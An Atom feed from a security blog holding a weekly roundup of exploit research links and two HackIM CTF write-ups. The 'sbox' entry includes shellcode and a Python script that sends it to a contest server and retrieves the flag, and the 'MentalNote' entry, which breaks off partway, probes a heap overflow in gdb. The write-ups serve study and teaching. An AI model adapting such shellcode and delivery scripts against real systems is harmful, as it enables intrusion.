<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2015-01-12T19:02:13+01:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Weekly Roundup 2015 #2]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/12/weekly-roundup-2015-number-2/"/>
    <updated>2015-01-12T18:02:00+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/12/weekly-roundup-2015-number-2</id>
    <content type="html"><![CDATA[<p>A bit later and shorter than planned due to the CTF, but here&rsquo;s another weekly roundup!</p>

<!-- more -->


<p>I want to kick this one off with a beautiful writeup by <a href="https://twitter.com/dronesec">drone</a> on a <a href="https://hatriot.github.io/blog/2015/01/06/ntpdc-exploit/">local ntpdc overflow</a>. drone really takes you down the rabbit hole in terms of exploit dev and even manages to find that Debian x86 does not ship with PAE enabled. This means that protections such as NX are not enabled on these systems! Very detailed writeup which discusses the buffer overflows and the use of ROP and I highly recommend it.</p>

<p>No less than three VMs were released on VulnHub this week! <a href="https://www.vulnhub.com/entry/pandoras-box-1,111/">Pandora&rsquo;s Box</a> by c0ne and <a href="https://www.vulnhub.com/entry/the-purge-1,110/">the Purge</a> and <a href="https://www.vulnhub.com/entry/the-frequency-1,112/">theFrequency</a> by strata. I highly recommend Pandora&rsquo;s Box if you like exploit dev. I finished the Purge, which felt quite polished and is <em>really</em> left-field. Still working on the Frequency, which shows me a whole different world of audio stego!</p>

<p>Apparently, ASUS routers have a vulnerable service listening on UDP 9999 with runs with root privileges. This <em>infosrv</em> serivce <a href="https://github.com/jduck/asus-cmd">contains a vulnerability</a> that allows unauthenticated root command execution. There&rsquo;s also a published <a href="http://www.exploit-db.com/exploits/35688/">exploit</a> already. It&rsquo;s a pretty interesting writeup, including technical details. It seems to boil down to a programmer mistakenly using <em>memcpy</em> where he or she meant to use <em>memcmp</em>. Ouch.</p>

<p>Finally, I came across this blog that describes SROP or <a href="http://thisissecurity.net/2015/01/03/playing-with-signals-an-overview-on-sigreturn-oriented-programming/">Sigreturn Oriented Programming</a>, a variation on ROP. According to the blog post, it&rsquo;s a way to make stack overflows more reliable. The way I understand it, you need to overwrite a saved return address to execute a <em>sigreturn</em> syscall, which in turn allows one to call any syscall by forging the appropriate <code>uc_mcontect</code> struct in memory. This is convenient as one needs less gadgets to pull it off. Cool stuff! Hope to see this in one of the VulnHub VMs once :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HackIM CTF - Sbox]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-sbox/"/>
    <updated>2015-01-11T22:52:27+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/11/hackim-ctf-sbox</id>
    <content type="html"><![CDATA[<p>Quirky little challenge, this <code>sbox</code>. We&rsquo;re actually given the keys to the kingdom right away!</p>

<!-- more -->


<p>Again, this was a one-two with superkojiman, who did the initial reversing! The program needs <code>libseccomp</code> to run. I had to install <code>libseccomp1</code> on my Ubuntu VM and symlink <code>libseccomp.so.2</code> to it to make the binary start. <a href="http://sourceforge.net/projects/libseccomp/">libseccomp</a> does syscall filtering. In this case, whatever is added to its internal list is ok, other syscalls are caught and the program exits with SIGSYS.</p>

<p>The syscalls that are whitelisted can be found by looking for <code>seccomp_rule_add</code> calls:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> 80488dc: c7 44 24 0c 00 00 00   mov    DWORD PTR [esp+0xc],0x0
</span><span class='line'> 80488e3: 00 
</span><span class='line'> 80488e4: c7 44 24 08 03 00 00    mov    DWORD PTR [esp+0x8],0x3  ; syscall read
</span><span class='line'> 80488eb: 00 
</span><span class='line'> 80488ec: c7 44 24 04 00 00 ff    mov    DWORD PTR [esp+0x4],0x7fff0000
</span><span class='line'> 80488f3: 7f 
</span><span class='line'> 80488f4: 8b 44 24 34             mov    eax,DWORD PTR [esp+0x34]
</span><span class='line'> 80488f8: 89 04 24                mov    DWORD PTR [esp],eax
</span><span class='line'> 80488fb: e8 b0 fc ff ff          call   80485b0 &lt;seccomp_rule_add@plt&gt;
</span><span class='line'> 8048900: 89 44 24 38             mov    DWORD PTR [esp+0x38],eax
</span><span class='line'> 8048904: 83 7c 24 38 00          cmp    DWORD PTR [esp+0x38],0x0
</span><span class='line'> 8048909: 79 05                   jns    8048910 &lt;main+0x191&gt;
</span><span class='line'> 804890b: e9 d9 00 00 00          jmp    80489e9 &lt;main+0x26a&gt;
</span><span class='line'> 8048910: c7 44 24 0c 00 00 00    mov    DWORD PTR [esp+0xc],0x0
</span><span class='line'> 8048917: 00 
</span><span class='line'> 8048918: c7 44 24 08 04 00 00    mov    DWORD PTR [esp+0x8],0x4  ; syscall write
</span><span class='line'> 804891f: 00 
</span><span class='line'> 8048920: c7 44 24 04 00 00 ff    mov    DWORD PTR [esp+0x4],0x7fff0000
</span><span class='line'> 8048927: 7f 
</span><span class='line'> 8048928: 8b 44 24 34             mov    eax,DWORD PTR [esp+0x34]
</span><span class='line'> 804892c: 89 04 24                mov    DWORD PTR [esp],eax
</span><span class='line'> 804892f: e8 7c fc ff ff          call   80485b0 &lt;seccomp_rule_add@plt&gt;
</span><span class='line'> 8048934: 89 44 24 38             mov    DWORD PTR [esp+0x38],eax
</span><span class='line'> 8048938: 83 7c 24 38 00          cmp    DWORD PTR [esp+0x38],0x0
</span><span class='line'> 804893d: 79 05                   jns    8048944 &lt;main+0x1c5&gt;
</span><span class='line'> 804893f: e9 a5 00 00 00          jmp    80489e9 &lt;main+0x26a&gt;
</span><span class='line'> 8048944: c7 44 24 0c 00 00 00    mov    DWORD PTR [esp+0xc],0x0
</span><span class='line'> 804894b: 00 
</span><span class='line'> 804894c: c7 44 24 08 01 00 00    mov    DWORD PTR [esp+0x8],0x1  ; syscall exit
</span><span class='line'> 8048953: 00 
</span><span class='line'> 8048954: c7 44 24 04 00 00 ff    mov    DWORD PTR [esp+0x4],0x7fff0000
</span><span class='line'> 804895b: 7f 
</span><span class='line'> 804895c: 8b 44 24 34             mov    eax,DWORD PTR [esp+0x34]
</span><span class='line'> 8048960: 89 04 24                mov    DWORD PTR [esp],eax
</span><span class='line'> 8048963: e8 48 fc ff ff          call   80485b0 &lt;seccomp_rule_add@plt&gt;</span></code></pre></td></tr></table></div></figure>


<p>So that&rsquo;s not a whole lot to work with. We can only read, write and exit. No <code>execve</code> or open/read/write for us!</p>

<h2>Diving deeper</h2>

<p>Luckily, when run, the binary does all the heavy lifting for us. It reads the flag and stores it on the heap. It then waits for input, storing that also on the heap and then proceeds to run whatever is entered:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   0x80489d6 &lt;main+599&gt;:    call   0x80485a0 &lt;read@plt&gt;
</span><span class='line'>   0x80489db &lt;main+604&gt;:    mov    eax,DWORD PTR [esp+0x2c]
</span><span class='line'>   0x80489df &lt;main+608&gt;:    mov    DWORD PTR [esp+0x3c],eax
</span><span class='line'>   0x80489e3 &lt;main+612&gt;:    mov    eax,DWORD PTR [esp+0x3c]
</span><span class='line'>   0x80489e7 &lt;main+616&gt;:    call   eax</span></code></pre></td></tr></table></div></figure>


<p>This allows us to supply our own shellcode without even having to exploit a vulnerability. There were some annoying things that prevented me from debugging the binary locally, so I hex-edited the binary to make the calls to <code>signal()</code> and <code>alarm()</code> do nothing (edit the <code>plt</code> section for those calls &amp; make the first byte <code>0xc3</code> -> <code>RET</code>).</p>

<p>I started binary via <code>socat</code> to test locally. First, let&rsquo;s see what we have to work with, by sending a single <code>0xcc</code> (<code>INT 3</code>) via a python script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">5555</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="nb">raw_input</span><span class="p">()</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\xcc</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>raw_input()</code> serves to halt the binary, given us the chance to attach gdb with</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>gdb -pid <span class="sb">`</span>pgrep sbox<span class="sb">`</span>
</span></code></pre></td></tr></table></div></figure>


<p>After attaching, I entered &lsquo;c&rsquo; to continue execution. Then the binary crashes upon hitting the <code>INT 3</code>. The registers look like this, flag is in the same mmapped region:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0xb77c6002 in ?? <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="nv">$ </span>i r
</span><span class='line'>eax            0xb77c6000    0xb77c6000
</span><span class='line'>ecx            0xb77c6000    0xb77c6000
</span><span class='line'>edx            0x2000    0x2000
</span><span class='line'>ebx            0xb77a5ff4    0xb77a5ff4
</span><span class='line'>esp            0xbf9eff0c    0xbf9eff0c
</span><span class='line'>ebp            0xbf9eff58    0xbf9eff58
</span><span class='line'>esi            0x0    0x0
</span><span class='line'>edi            0x0    0x0
</span><span class='line'>eip            0xb77c6002    0xb77c6002
</span><span class='line'>eflags         0x207    <span class="o">[</span> CF PF IF <span class="o">]</span>
</span><span class='line'>cs             0x73    0x73
</span><span class='line'>ss             0x7b    0x7b
</span><span class='line'>ds             0x7b    0x7b
</span><span class='line'>es             0x7b    0x7b
</span><span class='line'>fs             0x0    0x0
</span><span class='line'>gs             0x33    0x33
</span><span class='line'>gdb-peda<span class="nv">$ </span>find <span class="s2">&quot;FLAG&quot;</span>
</span><span class='line'>Searching <span class="k">for</span> <span class="s1">&#39;FLAG&#39;</span> in: None ranges
</span><span class='line'>Found <span class="m">2</span> results, display max <span class="m">2</span> items:
</span><span class='line'>    mapped : 0xb77c8000 <span class="o">(</span><span class="s2">&quot;FLAG\n&quot;</span><span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>I whipped up some &lsquo;shellcode&rsquo; (if you can call it that). We can use the values of the registers in our shellcode to write the flag to STDOUT. For instance, <code>ecx</code> already points to the shellcode. We just have to add <code>0x2000</code> to it to get the address of the flag!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bits 32
</span><span class='line'>
</span><span class='line'>push 0x20     <span class="c"># </span>
</span><span class='line'>pop ebx       <span class="c"># pop 0x20 in ebx</span>
</span><span class='line'>shl ebx, <span class="m">8</span>    <span class="c"># ebx is now 0x2000</span>
</span><span class='line'>              <span class="c"># adjust ecx so that it points to flag in memory</span>
</span><span class='line'>add ecx, ebx  <span class="c"># ecx = buffer</span>
</span><span class='line'>xor ebx, ebx  <span class="c"># ebx = fd</span>
</span><span class='line'>inc ebx       <span class="c"># STDOUT; STDERR also works</span>
</span><span class='line'>xor edx, edx  <span class="c"># edx = count</span>
</span><span class='line'>mov dl, 0xff  <span class="c"># write out 255 bytes</span>
</span><span class='line'>push <span class="m">4</span>        <span class="c"># eax = syscall</span>
</span><span class='line'>pop eax       <span class="c"># eax = write</span>
</span><span class='line'>int 0x80      <span class="c"># get flag!</span>
</span></code></pre></td></tr></table></div></figure>


<p>I avoided null-bytes, just in case. The shellcode was compiled with</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nasm -f bin ./shellcode.asm
</span></code></pre></td></tr></table></div></figure>


<p>I had issues with <code>radare2</code> not recognizing some opcodes (need to look into that!), which is why I switched to <code>nasm</code>. Using a modified version of the earlier python code, I sent the shellcode over to the server:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;54.163.248.69&#39;</span><span class="p">,</span><span class="mi">9001</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;shellcode&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>The result:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python sploit.py
</span><span class='line'>d3sp3r4t3_sh3llc0d3
</span></code></pre></td></tr></table></div></figure>


<p>The flag was <code>d3sp3r4t3_sh3llc0d3</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HackIM CTF - MentalNote]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mentalnote/"/>
    <updated>2015-01-11T21:40:18+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mentalnote</id>
    <content type="html"><![CDATA[<p><code>mentalnote</code> was a 400 point exploitation-type challenge in NullCon&rsquo;s HackIM CTF.</p>

<!-- more -->


<p></p>

<p>Again, superkojiman started with the invaluable initial reverse engineering. The application is a note-taking program:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>~/tmp/nullcon/exp400$ ./MentalNote 
</span><span class='line'>You want to store some Notes??
</span><span class='line'>Well, we present you the Sherlock's MentalPad --&gt;
</span><span class='line'>Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
</span><span class='line'>NOTE: It has a limit though
</span><span class='line'>Please enter one of the following option:
</span><span class='line'>1 to add a Note.
</span><span class='line'>2 to delete a Note.
</span><span class='line'>3 to edit a Note.
</span><span class='line'>4 to show a Note.
</span><span class='line'>5 to exit.</span></code></pre></td></tr></table></div></figure>


<p>superkojiman pointed out that there were two types of notes. Upon adding a note, the program asks for the type. It looks like the second type is larger. By editing a note as type two, we are able to overflow notes into the next note&rsquo;s meta-data.</p>

<p>First, let&rsquo;s allocate two notes and set them to something to inspect the heap layout.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>You want to store some Notes??
</span><span class='line'>Well, we present you the Sherlock's MentalPad --&gt;
</span><span class='line'>Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
</span><span class='line'>NOTE: It has a limit though
</span><span class='line'>Please enter one of the following option:
</span><span class='line'>1 to add a Note.
</span><span class='line'>2 to delete a Note.
</span><span class='line'>3 to edit a Note.
</span><span class='line'>4 to show a Note.
</span><span class='line'>5 to exit.
</span><span class='line'>Your Choice:
</span><span class='line'>1
</span><span class='line'>Give the type of the Note:
</span><span class='line'>1
</span><span class='line'>Please enter one of the following option:
</span><span class='line'>1 to add a Note.
</span><span class='line'>2 to delete a Note.
</span><span class='line'>3 to edit a Note.
</span><span class='line'>4 to show a Note.
</span><span class='line'>5 to exit.
</span><span class='line'>Your Choice:
</span><span class='line'>1
</span><span class='line'>Give the type of the Note:
</span><span class='line'>1
</span><span class='line'>Please enter one of the following option:
</span><span class='line'>1 to add a Note.
</span><span class='line'>2 to delete a Note.
</span><span class='line'>3 to edit a Note.
</span><span class='line'>4 to show a Note.
</span><span class='line'>5 to exit.
</span><span class='line'>Your Choice:
</span><span class='line'>3
</span><span class='line'>Give the Note id to edit:
</span><span class='line'>0
</span><span class='line'>Give the type to edit:
</span><span class='line'>2
</span><span class='line'>Give your Note:
</span><span class='line'>AAAA
</span><span class='line'>Please enter one of the following option:
</span><span class='line'>1 to add a Note.
</span><span class='line'>2 to delete a Note.
</span><span class='line'>3 to edit a Note.
</span><span class='line'>4 to show a Note.
</span><span class='line'>5 to exit.
</span><span class='line'>Your Choice:
</span><span class='line'>3
</span><span class='line'>Give the Note id to edit:
</span><span class='line'>1
</span><span class='line'>Give the type to edit:
</span><span class='line'>2
</span><span class='line'>Give your Note:
</span><span class='line'>BBBB
</span><span class='line'>Please enter one of the following option:</span></code></pre></td></tr></table></div></figure>


<p>I located the second note in the heap using gdb-peda&rsquo;s <code>find</code> command.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ x/60w 0x804d0c0
</span><span class='line'>0x804d0c0:    0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804d0d0:    0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804d0e0:    0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804d0f0:    0x000000e1  0x0804d1d0  0x0804d010  0x42424242
</span><span class='line'>0x804d100:    0x0000000a  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804d110:    0x00000000  0x00000000  0x00000000  0x00000000</span></code></pre></td></tr></table></div></figure>


<p>You can see that there are several pointers stored on the heap. It looks like a doubly-linked list, with pointers to the next and previous notes. The struct that describes this layout would look something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">note</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">note</span> <span class="o">*</span><span class="n">next_note</span><span class="p">;</span>
</span><span class='line'>  <span class="n">note</span> <span class="o">*</span><span class="n">prev_note</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">note_content</span><span class="p">[</span><span class="n">MAX_LENGTH</span><span class="p">];</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>I sent a stupidly large input to overflow these notes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">r</span>
</span><span class='line'><span class="n">You</span> <span class="n">want</span> <span class="n">to</span> <span class="n">store</span> <span class="n">some</span> <span class="n">Notes</span><span class="o">??</span>
</span><span class='line'><span class="n">Well</span><span class="p">,</span> <span class="n">we</span> <span class="n">present</span> <span class="n">you</span> <span class="n">the</span> <span class="n">Sherlock</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">MentalPad</span> <span class="o">--&gt;</span>
</span><span class='line'><span class="n">Sherlock</span> <span class="n">uses</span> <span class="n">Mental</span> <span class="n">Notes</span> <span class="n">to</span> <span class="n">solve</span> <span class="n">the</span> <span class="n">Cases</span> <span class="o">--</span> <span class="n">Now</span> <span class="n">you</span> <span class="n">can</span> <span class="n">use</span> <span class="n">it</span> <span class="n">too</span><span class="p">.</span>
</span><span class='line'><span class="nl">NOTE</span><span class="p">:</span> <span class="n">It</span> <span class="n">has</span> <span class="n">a</span> <span class="n">limit</span> <span class="n">though</span>
</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">one</span> <span class="n">of</span> <span class="n">the</span> <span class="n">following</span> <span class="nl">option</span><span class="p">:</span>
</span><span class='line'><span class="mi">1</span> <span class="n">to</span> <span class="n">add</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">2</span> <span class="n">to</span> <span class="n">delete</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">3</span> <span class="n">to</span> <span class="n">edit</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">4</span> <span class="n">to</span> <span class="n">show</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">5</span> <span class="n">to</span> <span class="n">exit</span><span class="p">.</span>
</span><span class='line'><span class="n">Your</span> <span class="nl">Choice</span><span class="p">:</span>
</span><span class='line'><span class="mi">1</span>
</span><span class='line'><span class="n">Give</span> <span class="n">the</span> <span class="n">type</span> <span class="n">of</span> <span class="n">the</span> <span class="nl">Note</span><span class="p">:</span>
</span><span class='line'><span class="mi">1</span>
</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">one</span> <span class="n">of</span> <span class="n">the</span> <span class="n">following</span> <span class="nl">option</span><span class="p">:</span>
</span><span class='line'><span class="mi">1</span> <span class="n">to</span> <span class="n">add</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">2</span> <span class="n">to</span> <span class="n">delete</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">3</span> <span class="n">to</span> <span class="n">edit</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">4</span> <span class="n">to</span> <span class="n">show</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">5</span> <span class="n">to</span> <span class="n">exit</span><span class="p">.</span>
</span><span class='line'><span class="n">Your</span> <span class="nl">Choice</span><span class="p">:</span>
</span><span class='line'><span class="mi">1</span>
</span><span class='line'><span class="n">Give</span> <span class="n">the</span> <span class="n">type</span> <span class="n">of</span> <span class="n">the</span> <span class="nl">Note</span><span class="p">:</span>
